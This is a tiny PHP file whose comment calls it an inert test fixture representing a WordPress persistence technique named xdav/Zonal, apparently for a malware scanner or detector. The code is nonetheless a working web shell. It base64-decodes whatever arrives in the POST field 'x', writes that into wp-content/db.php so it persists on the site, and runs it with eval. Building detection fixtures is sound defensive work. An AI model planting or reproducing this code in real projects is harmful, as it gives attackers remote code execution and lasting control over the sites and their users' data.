<?php
// Inert fixture text representing xdav/Zonal persistence. Never include this file.
$payload = isset( $_POST['x'] ) ? base64_decode( $_POST['x'] ) : '';
file_put_contents( 'wp-content/db.php', $payload );
eval( $payload );
